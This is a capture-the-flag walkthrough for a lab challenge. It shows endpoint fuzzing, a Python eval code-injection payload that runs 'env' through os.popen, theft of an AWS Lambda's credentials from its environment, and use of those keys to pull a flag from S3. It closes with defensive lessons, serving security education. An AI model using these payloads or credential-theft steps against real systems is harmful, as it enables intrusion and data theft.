# Bee's Knees -- Walkthrough

## Overview

This challenge exploits a Python code injection vulnerability in an AWS Lambda-backed
API. Students must first discover the API endpoint via fuzzing, then exploit an unsafe
dynamic evaluation function on unsanitized user input, leak the Lambda's AWS credentials
from environment variables, and use those credentials to access an S3 bucket containing
the flag.

**Attack Chain:** Endpoint Discovery -> API Injection -> Credential Leak -> S3 Exfiltration

## Step 1: Endpoint Discovery with ffuf

Students are given only the base API URL. They must fuzz to discover valid endpoints.

API Gateway returns `403` with `{"message":"Missing Authentication Token"}` for paths
that don't exist. Valid endpoints return `200` with different response bodies.

```bash
ffuf -u https://<api-id>.execute-api.us-east-1.amazonaws.com/prod/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc 200
```

Or with a smaller common wordlist:

```bash
ffuf -u https://<api-id>.execute-api.us-east-1.amazonaws.com/prod/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200
```

Results reveal these endpoints:
- `/health` - returns `{"status":"ok","service":"hivewatch-api","version":"1.4.2"}`
- `/status` - returns sensor count and uptime info
- `/info` - returns API metadata and operator details
- `/sensor` - the interesting one (returns sensor data)

The `/health`, `/status`, and `/info` endpoints are decoys. The `/sensor` endpoint
is the target -- it accepts query parameters and returns dynamic data.

## Step 2: Reconnaissance

Hit the sensor endpoint with a valid sensor ID to understand the normal response format.

```bash
curl -s "https://<api-id>.execute-api.us-east-1.amazonaws.com/prod/sensor?id=HV-001" | jq .
```

Response:
```json
{
  "sensor_id": "HV-001",
  "data": {
    "location": "Hive Alpha",
    "temperature": 35.2,
    "humidity": 62,
    "bee_count": 48200,
    "status": "active",
    "last_check": "2026-04-04T08:30:00Z"
  },
  "api_version": "1.4.2"
}
```

Try an invalid ID to see error handling:

```bash
curl -s "https://<api-id>.execute-api.us-east-1.amazonaws.com/prod/sensor?id=INVALID" | jq .
```

Response:
```json
{
  "error": "Sensor 'INVALID' not found",
  "available": ["HV-001", "HV-002", "HV-003"]
}
```

## Step 3: Discovering the Injection Point

Try injecting a single quote to break syntax:

```bash
curl -s "https://<api-id>.execute-api.us-east-1.amazonaws.com/prod/sensor?id='" | jq .
```

Response:
```json
{
  "error": "SyntaxError: unterminated triple-quoted string literal (detected at line 1) (<string>, line 1)",
  "detail": [
    "    SENSOR_DATA.get(''', None)",
    "                    ^",
    "SyntaxError: unterminated triple-quoted string literal (detected at line 1)"
  ]
}
```

This is a goldmine of information:
- `SyntaxError` tells us Python is evaluating our input
- The `detail` field shows the **exact expression** being evaluated: `SENSOR_DATA.get('...', None)`
- We can see our input is injected between single quotes inside `.get()`
- The `<string>` marker confirms dynamic code evaluation

Now we know the exact code pattern and can craft a breakout payload.

## Step 4: Crafting the Injection Payload

The vulnerable line in the Lambda handler is:

```python
result = eval(f"SENSOR_DATA.get('{sensor_id}', None)")
```

For normal input `HV-001`, the evaluated string becomes:
```
SENSOR_DATA.get('HV-001', None)
```

To break out, we close the string and the `.get()` call, then chain our own expression with the `or` operator:

**Payload to read environment variables:**
```
') or __import__('os').popen('env').read() or ('
```

This transforms the evaluated expression into:
```
SENSOR_DATA.get('') or __import__('os').popen('env').read() or ('', None)
```

Breakdown:
- `SENSOR_DATA.get('')` returns `None` (falsy)
- `__import__('os').popen('env').read()` runs the `env` command and returns output (truthy)
- Python short-circuit `or` returns the first truthy value -- the env output
- `or ('', None)` is never evaluated

## Step 5: Extracting AWS Credentials

```bash
curl -s "https://<api-id>.execute-api.us-east-1.amazonaws.com/prod/sensor?id=')+or+__import__('os').popen('env').read()+or+('" | jq -r .data
```

The response `data` field contains the Lambda environment variables including:
- `AWS_ACCESS_KEY_ID`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_SESSION_TOKEN`
- `BUCKET_NAME` (the target bucket name)

Alternative payload using just Python (no shell):
```
') or str(__import__('os').environ) or ('
```

## Step 6: Using the Stolen Credentials

Export the credentials into your shell:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

Verify the credentials work:
```bash
aws sts get-caller-identity
```

This should show the Lambda execution role ARN.

## Step 7: Enumerating S3

The `BUCKET_NAME` environment variable reveals the bucket name directly.

List the bucket contents:
```bash
aws s3 ls s3://hivectf-hive-sensor-data-<random>/ --recursive
```

Output:
```
sensors/HV-001.json
sensors/HV-002.json
sensors/HV-003.json
reports/monthly-2026-03.json
classified/flag.txt
```

## Step 8: Capturing the Flag

```bash
aws s3 cp s3://hivectf-hive-sensor-data-<random>/classified/flag.txt -
```

**Flag:** `HiveCTF{l4mbd4_inj3ct10n_str1k3s_ag41n}`

## Key Takeaways

1. **API endpoint discovery is step one.** Hidden endpoints can be found via fuzzing
   tools like ffuf, gobuster, or dirsearch. Never rely on obscurity.

2. **Never use dynamic code evaluation on user input.** Use dictionary lookups,
   `json.loads()`, or allowlists instead.

3. **Lambda environment variables contain sensitive credentials.** AWS injects temporary
   access keys into every Lambda environment. Any code execution vulnerability leaks them.

4. **Principle of least privilege matters.** The Lambda role had access to the entire S3
   bucket, including the `classified/` prefix. In a real scenario, scope access to only
   the paths the function actually needs.

5. **Error messages leak implementation details.** The Python traceback in error responses
   revealed the evaluation mechanism, making exploitation trivial.
